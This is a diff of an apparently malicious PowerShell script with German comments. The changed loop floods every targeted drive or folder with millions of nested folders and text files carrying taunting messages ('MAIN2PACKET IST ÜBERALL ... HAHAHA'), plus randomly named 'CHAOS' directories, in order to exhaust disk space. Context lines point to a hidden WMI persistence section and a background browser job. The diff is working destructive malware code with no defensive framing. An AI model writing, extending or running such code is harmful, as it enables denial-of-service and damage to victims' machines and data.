@@ -210,42 +210,70 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE =====
+# ===== HAUPTSCHLEIFE - NUR ORDNER MIT TEXTFILES =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
+    
+    Write-Host "Runde $global:currentRound - Erstelle Ordner-Strukturen..." -ForegroundColor Magenta
     
     # JEDES ZIEL IN DER LISTE BEARBEITEN!
     foreach ($ziel in $alleZiele) {
         if (Test-Path $ziel) {
-            # Hauptordner erstellen
-            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
-            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
-            
-            # 500 DATEIEN PRO ZIEL
-            for ($i = 1; $i -le 1000000000000000; $i++) {
-                # Direkt im Zielordner
-                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
-                
-                # Im Hauptordner
-                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DAS WARS MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
+            # 500 HAUPTORDNER PRO ZIEL (statt 1)
+            for ($h = 1; $h -le 5000; $h++) {
+                # Hauptordner mit zufälligem Namen
+                $mainFolder = Join-Path $ziel "MAIN2PACKET_$global:currentRound`_$h"
+                try { 
+                    New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null 
+                    
+                    # In JEDEM Hauptordner: 100 UNTERORDNER
+                    for ($u = 1; $u -le 1000; $u++) {
+                        $subFolder = Join-Path $mainFolder "SUB_$u"
+                        New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                        
+                        # In JEDEM Unterordner: 500 TEXTDATEIEN
+                        for ($t = 1; $t -le 5000; $t++) {
+                            $textFile = Join-Path $subFolder "dokument_$t.txt"
+                            "MAIN2PACKET IST ÜBERALL - Ordner $h - Sub $u - Datei $t" | Out-File $textFile -Encoding UTF8 -Force
+                        }
+                    }
+                    
+                    # Zusätzlich: 200 DATEIEN direkt im Hauptordner
+                    for ($d = 1; $d -le 2000; $d++) {
+                        $directFile = Join-Path $mainFolder "direct_$d.txt"
+                        "MAIN2PACKET DIREKT - Ordner $h - Datei $d" | Out-File $directFile -Encoding UTF8 -Force
+                    }
+                    
+                } catch {}
             }
             
-            # 500 UNTERORDNER
-            for ($u = 1; $u -le 1000; $u++) {
-                $subFolder = Join-Path $mainFolder "SUB_$u"
-                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
-                
-                # 500 DATEIEN PRO UNTERORDNER
-                for ($s = 1; $s -le 1000; $s++) {
-                    $subFile = Join-Path $subFolder "subfile_$s.king"
-                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
-                }
+            # EXTRA CHAOS: 200 ORDNER mit zufälligen Namen
+            for ($random = 1; $random -le 200; $random++) {
+                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
+                $randomFolder = Join-Path $ziel "CHAOS_$randomName"
+                try {
+                    New-Item -Path $randomFolder -ItemType Directory -Force | Out-Null
+                    
+                    # 20-50 Unterordner in jedem Chaos-Ordner
+                    $subCount = Get-Random -Minimum 20 -Maximum 50
+                    for ($rc = 1; $rc -le $subCount; $rc++) {
+                        $randomSub = Join-Path $randomFolder "sub_$rc"
+                        New-Item -Path $randomSub -ItemType Directory -Force | Out-Null
+                        
+                        # 100-200 Textdateien in jedem Chaos-Unterordner
+                        $fileCount = Get-Random -Minimum 100 -Maximum 200
+                        for ($fc = 1; $fc -le $fileCount; $fc++) {
+                            $chaosFile = Join-Path $randomSub "chaos_$fc.txt"
+                            "CHAOS $randomName - Datei $fc" | Out-File $chaosFile -Encoding UTF8 -Force
+                        }
+                    }
+                } catch {}
             }
         }
     }
     
     # KURZE PAUSE ZWISCHEN RUNDEN
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 2
 }
 
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
